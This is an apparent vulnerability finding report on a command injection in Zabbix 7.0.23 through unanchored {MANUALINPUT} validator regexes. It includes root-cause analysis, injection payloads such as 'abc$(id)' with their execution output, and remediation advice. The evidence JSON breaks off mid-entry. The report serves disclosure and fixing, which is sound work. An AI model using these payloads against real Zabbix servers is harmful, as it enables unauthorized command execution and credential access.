findings.title: Command Injection via MANUALINPUT Unanchored Regex Bypass
findings.details:
PRISTINE VALIDATION: 3 rounds, 12 injections confirmed.

Vulnerability: The {MANUALINPUT} macro in Zabbix script execution allows command injection when the manualinput_validator regex is not anchored with ^...$.

Root Cause:
  1. validate_manualinput() in src/libs/zbxtrapper/nodecommand.c uses zbx_regexp_match_full() which calls pcre2_match() for PARTIAL matching
  2. An unanchored regex like [a-zA-Z0-9]+ matches 'abc$(id)' because 'abc' satisfies the partial match
  3. substitute_macro() performs raw string replacement without shell escaping
  4. Commands execute via execl('/bin/sh', 'sh', '-c', command)

Impact:
  - Any user with script.execute permission can inject arbitrary OS commands
  - Commands execute as the 'zabbix' user on the server/agent/proxy
  - Can read server configuration (database credentials)
  - Can access monitored infrastructure from the server

Tested version: Zabbix 7.0.23
Execution context: uid=1997(zabbix) gid=1995(zabbix)
findings.evidence:
[
  {
    "round": 1,
    "tests": [
      {
        "payload": "test123",
        "description": "Clean baseline",
        "regex_type": "UNANCHORED",
        "expected": "ACCEPT",
        "actual": "ACCEPT",
        "matched": true,
        "output": "OUTPUT_test123_END\n"
      },
      {
        "payload": "test123",
        "description": "Clean baseline",
        "regex_type": "ANCHORED",
        "expected": "ACCEPT",
        "actual": "ACCEPT",
        "matched": true,
        "output": "OUTPUT_test123_END\n"
      },
      {
        "payload": "abc$(pwd)",
        "description": "Command substitution $(pwd)",
        "regex_type": "UNANCHORED",
        "expected": "INJECT",
        "actual": "INJECT",
        "matched": true,
        "output": "OUTPUT_abc/var/lib/zabbix_END\n"
      },
      {
        "payload": "abc$(pwd)",
        "description": "Command substitution $(pwd)",
        "regex_type": "ANCHORED",
        "expected": "REJECT",
        "actual": "REJECT",
        "matched": true,
        "output": "Provided script user input failed validation."
      },
      {
        "payload": "abc$(id)",
        "description": "Command substitution $(id)",
        "regex_type": "UNANCHORED",
        "expected": "INJECT",
        "actual": "INJECT",
        "matched": true,
        "output": "OUTPUT_abcuid=1997(zabbix) gid=1995(zabbix) groups=1995(zabbix),20(dialout)_END\n"
      },
      {
        "payload": "abc$(id)",
        "description": "Command substitution $(id)",
        "regex_type": "ANCHORED",
        "expected": "REJECT",
        "actual": "REJECT",
        "matched": true,
        "output": "Provided script user input failed validation."
      },
      {
        "payload": "abc`pwd`",
        "description": "Backtick substitution",
        "regex_type": "UNANCHORED",
        "expected": "INJECT",
        "actual": "INJECT",
        "matched": true,
        "output": "OUTPUT_abc/var/lib/zabbix_END\n"
      },
      {
        "payload": "abc`pwd`
findings.remediation:
1. Shell-escape the MANUALINPUT value before substitution: wrap in single quotes and escape internal single quotes.
2. Enforce anchored regex: automatically prepend ^ and append $ to the validator regex, or use PCRE2_ANCHORED + PCRE2_ENDANCHORED flags.
3. Add a character blocklist for MANUALINPUT values: reject $, `, \, and other shell metacharacters before regex validation.
4. Use environment variable passing instead of string interpolation: set MANUALINPUT as an env var and reference $MANUALINPUT in the command.
